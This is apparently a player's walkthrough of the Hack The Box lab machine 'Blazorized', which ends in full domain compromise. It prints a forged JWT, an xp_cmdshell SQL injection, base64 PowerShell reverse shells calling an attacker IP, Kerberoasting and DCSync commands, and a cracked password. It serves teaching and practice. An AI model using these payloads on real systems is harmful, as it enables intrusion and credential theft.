### Initial Enumeration

The Initial nmap scan for this machine gives me a lot to work with. I started with the webserver on port 80. I first wanted to enumerate any subdomains.

```
fuff -u 'http://blazorized.htb' -H "Host: http://FUZZ.blazorized.htb" -w /usr/share/wordlists/subdomains/n0kovo_subdomains/n0kovo_subdomains_medium.txt -fc 301,302
```

The two I found, admin and api, are bound to be useful soon. 

### DLL Discovery and Decompilation

Looking back at Burp, I see that the server sent us a bunch of DLL's upon our first visit to the site. A few of them look interesting; namely Blazorized.LocalStorage, Blazorized.DigitalGarden, Blazorized.Shared, and Blazorized.Helpers. I used wget to grab the files, then got to work analyzing them. Before I could though, they needed to be decompiled, luckily for me, DNSpy does exactly that.

In the blazorized.helper.dll I get a symmetric security key that I can use to generate my own JWT and presumably gain access to the site. I also gained a list of available roles on the site, which I'll need when generating my token.

```
secret = 8697800004ee25fc33436978ab6e2ed6ee1a97da699a53a53d96cc..........
```

[Jwt.io](https://jwt.io/) will create my JWT for me after plugging in the necessary bits of information, no need to overcomplicate things.

Payload:

```
{"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress": "superadmin@blazorized.htb",
  "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": [
    "Super_Admin"
  ],
  "exp": 1999999999,
  "iss": "http://api.blazorized.htb",
  "aud": "http://admin.blazorized.htb"
}
```

JWT:

```
eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9lbWFpbGFkZHJlc3MiOiJzdXBlcmFkbWluQGJsYXpvcml6ZWQuaHRiIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjpbIlN1cGVyX0FkbWluIl0sImV4cCI6MTk5OTk5OTk5OSwiaXNzIjoiaHR0cDovL2FwaS5ibGF6b3JpemVkLmh0YiIsImF1ZCI6Imh0dHA6Ly9hZG1pbi5ibGF6b3JpemVkLmh0YiJ9.o-KXYj2GmpdS3DQpLeJoEPeL5f9ogyLZWnVIgGSNM6itItMVum5oPicvNAy6sDxAu2_01am5VxOdLgGK5dht8A
```

I navigate to the admin panel, add the JWT to my local storage on Firefox, and refresh the page to gain access.

### SQL Injection and First Shell

The admin panel allows me to directly interact with the SQL database hosted on the machine. I do a manual SQL injection that looks a little something like this into one of the check duplicate fields and I get my first shell! I used base 64 encoded commands to make my syntax as simple as possible, and avoid a spaghetti of ticks. Note that xp-cmdshell was not enabled by default.  I enabled it before sending this command.

```
haxorized'; EXEC xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANQAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=';--
```

Before doing so I made sure to start a listener on my local machine.

```
nc -nvlp 4444
```

I log in as the user NU_1055. I did the usual winpeas and winpspy, but didn't find anything exceptionally useful. 

### Active Directory Enumeration, SPN-Jacking and Kerberoasting

From here I quickly uploaded SharpHound.exe on the box, started neo4j on my local machine, and awaited the Active Directory information from my collector. After doing some digging in the information it collected, I found that my user, NU_1055, had the ability to set a Service Principal Name (SPN) on the user RSA_4810. Bloodhound points us to PowerView.ps1, which we quickly upload to the box. We then get to work on SPN-jacking, a crucial step in Kerberoasting.

Run the script:

```
./PowerView.ps1
```

Set the SPN:

```
Set-DomainObject -Identity RSA_4810 -SET @{serviceprincipalname='foo/foo'}
```

Finally, request a service ticket (Kerberoasting):

```
Get-DomainSPNTicket -SPN foo/foo
```

We get the password hash of RSA_4810, and crack it with hashcat.

```
hashcat "E:\HTB\VirtualBox VMs\Kali\Share\hashes.txt" -m 13100 --opencl-device-types=1,2 E:\HTB\Wordlists\rockyou.txt -r rules/best64.rule -o rsa4810.txt
```

It takes a while, but it eventually cracks! Who would've thought that this was in rockyou!

```
RSA_4810::(Ni7856Do9854Ki05Ng0005 #)
```

Now that I have a password, I can log in via winrm.

```
evil-winrm -i blazorized.htb -u RSA_4810 -p '(Ni7856Do9854Ki05Ng0005 #)'
```

### Privilege Escalation 

While coming through the AD information from earlier, I learned that SSA_6010 has DCSync permissions. For posterity, I'll check to see if the domain holds any useful information about this user. Very glad I did this.

```
net user SSA_6010 /domain
```

The user has a login script:

```
\\dc1\NETLOGON\A2BFDCF13BB2\B00AC3C11C0E\BAEDDDCD2BCB\C0B3ACE33AEF\2C0A3DFE2030.bat
```

I am determined to make them regret it.

First I look for a spot that I can write a new script:

```
Get-ChildItem -Path "\\dc1\netlogon" -Directory -Recurse | ForEach-Object { if ((Get-Acl $_.FullName).Access | Where-Object { $_.FileSystemRights -match "Write" -and $_.IdentityReference -eq [System.Security.Principal.WindowsIdentity]::GetCurrent().Name }) { $_.FullName } }
```

`\\dc1\netlogon\A32FF3AEAA23` is writeable and in the proper directory (netlogon). Now we're cooking. I upload PowerView to `C:\Windows\Tasks`:

```
Import-Module .\PowerView.ps1
```

Set a new location for the logon script in the writeable directory over the .bat file already located there:

```
$user = "SSA_6010"
$newScriptPath = "A32FF3AEAA23\02FCE0D1303F.bat"
$userDN = Get-DomainUser -Identity $user | Select-Object -ExpandProperty distinguishedname
Set-DomainObject -Identity $userDN -Set @{'scriptPath' = $newScriptPath}
```

Create a file on my local machine called 02FCE0D1303F.bat and put a base64 reverse shell in it:

```
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
```

Start a new listener:

```
nc -nvlp 4445
```

Finally, I waited for the automated SSA_6010 logon. Pretty fun privesc!
### DCSync Attack and Root Access

I upload Mimikatz to `C:\Windows\Tasks`, making sure it's the newest version, and run this command to dump the lsa secrets.

```
cmd.exe /c .\mimikatz.exe "lsadump::dcsync /All" "exit" >> .\lsa.dmp
```

In the lsa dump I get the Administrator's NT hash.

```
Administrator::f55ed14..................
```

Finally, for root on the DC, I use it to log in as Administrator.

```
evil-winrm -i blazorized.htb -u Administrator -H 'f55ed14....................'
```

Easy peezy (it was not easy peezy).


